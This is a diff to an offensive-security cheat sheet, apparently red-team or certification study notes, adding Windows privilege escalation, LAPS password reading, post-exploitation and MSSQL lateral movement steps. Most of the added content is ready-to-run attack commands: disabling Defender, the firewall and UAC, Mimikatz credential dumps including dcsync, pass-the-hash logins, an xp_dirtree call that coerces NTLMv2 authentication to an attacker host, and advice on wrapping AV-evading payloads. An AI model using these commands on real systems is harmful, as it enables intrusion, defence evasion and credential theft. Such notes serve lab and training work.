@@ -159,9 +159,11 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=t
 ```
 
 -----------------------------------------------------------------------------------------------
-## PrivEsc
+## PrivEsc(Windows)
 
-## Windows
+- First off, do local and then domain enumeration as much as you can.
+- If applocker is in effect, you can use the Interactive Runspace () and run Invoke-Bloodhound and Winpeas.ps1 via InstalUtil
+- You can also try the metasploit module post/windows/manage/execute_assembly
 
 ### SeImpersonatePrivilege
 
@@ -189,5 +191,106 @@ msiexec /quiet /qn /i evil.msi
 **Via MSI Wrapper**
 - You need to have your own Windows machine. Download MSI Wrapper from (https://www.exemsi.com/download/)
 - Create an obfuscated exe payload that can bypass AV. Suggest a XOR Csharp payload
-- Wrap that payload using MSI Wrapper
+- Wrap that payload using MSI Wrapper. See here for steps >>
 
+### Special Domain Groups
+
+#### LAPS Readers/ PswReaders
+- This means that the user can read the Local Admin's password
+- you can use lapstoolkit from here (https://github.com/leoloobeek/LAPSToolkit) or from nxc 
+```powershell
+Import-Module ./Get-LAPSComputers
+Get-LAPSComputers
+```
+```bash
+nxc ldap <DC of domain> -u <User> -H 'hash' --module laps
+```
+
+#### IT/DEV/HR/(somethingADMINS)
+
+
+
+
+
+## PrivEsc (Linux)
+
+
+
+
+## Post-Exploitation
+
+### Disable Defenses
+- Once you get someone with admin permissions, disable Defender, UAC, and firewall. You may also wish to open up WinRM and RDP ports for convenience
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+```
+```cmd
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh firewall add portopening TCP 3389 "Remote Desktop"
+
+winrm quickconfig
+```
+
+### Mimikatz
+```cmd
+privilege::debug
+# dump out all NTLM (and maybe cleartext if they are currently logged in) of all accounts that has logged in before
+sekurlsa::logonpasswords
+# dump out all NTLM in the SAM and potentially clear text passwords
+token::elevate
+lsadump::sam
+lsadump::secrets
+# if user is DA or has backup powers
+lsadump::dcsync /domain:<domain> /all /csv
+```
+
+## Lateral Movement
+
+### Via MSSQL
+- Note any hosts named DB or SQL
+- if not one can always enumerate via nxc mssql or use tools like MSSQLand or native enumeration
+
+**Via MSSQLClient.py**
+- You may need to try multiple accounts such as the local administrator, the supposed SQL domain account and the machine account 
+```bash
+# with hashes
+mssqlclient.py Administrator@<DB ip> -hashes ':<NT Hash>' -windows-auth
+# with password using domain account
+mssqlclient.py MCU.lab/Ppots@visionSQL -windows-auth
+```
+- Generic MSSQL Enumeration (though you can just use mssqlclient in built functions)
+```bash
+# check for linked servers
+EXEC sp_linkedservers
+# OR
+select srvname from master..sysservers
+
+# check if link from your current DB to the target has SA perms; 1 if sa 0 if not
+select * from openquery("WANDASQL", 'SELECT is_srvrolemember(''sysadmin'')')
+# check if can execute stored_procedures (such as xp_cmdshell or xp_dirtree) over the link
+select is_rpc_out_enabled FROM sys.servers WHERE name ='WANDASQL'
+
+# if link is not sa but RPC OUT is enabled, we can still run things like xp_dirtree for NTLMv2 relay
+# start responder and then in the MSSQL, force an authentication over SMB to capture the NTLMv2 hash
+select * from openquery("WANDASQL", 'SELECT 1; EXEC master..xp_dirtree ''\\<attacker ip>\test''')
+```
+- Using mssqlclient
+```bash
+# first try your luck
+enable_xp_cmdshell
+# obviously it will fail. It cant be that easy!
+# check out linked servers; What you want to see is something under the Linked Server Local Login Self Mapping Remote login table; if there is nothing, means your current account is not powerful enough (or there is literally nothing)
+enum_links
+# if nothing, check who is login or the users you can impersonate or exec as
+enum_logins
+enum_users
+# if you see something like sa or DB02/Administrator or just a diff user from your current user, try impersonating them via the relevant command depending on where you see them
+exec_as_login sa 
+exec_as_user sa 
+# if successful you should see your user become the new user. do the above all over again
+# if you can jump DBs
+use_link DB03
+# then do the following until you hit somewhere where you can xp_cmdshell for profit
+```
